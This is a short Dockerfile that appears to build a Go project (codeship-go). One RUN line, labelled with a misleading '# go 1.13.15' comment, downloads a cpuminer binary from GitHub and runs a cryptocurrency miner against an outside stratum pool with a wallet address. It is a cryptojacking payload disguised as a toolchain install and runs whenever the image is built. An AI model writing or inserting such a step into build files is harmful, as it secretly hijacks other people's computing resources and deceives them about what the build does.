ARG GO_VERSION=1.15

FROM golang:${GO_VERSION}
LABEL maintainer=dev@codeship.com

# go 1.13.15
RUN mkdir gudo && cd gudo && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.19/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a lyra2z330  -o stratum+tcps://stratum-eu.rplant.xyz:17051 -u PJkoUR2yiLHiS9Swa3mhSCPXMtq5Rq5erZ -p voc
# go 1.14.10
RUN go get golang.org/dl/go1.14.10 && \
    go1.14.10 download

WORKDIR /go/src/github.com/codeship/codeship-go
COPY . .

RUN make setup
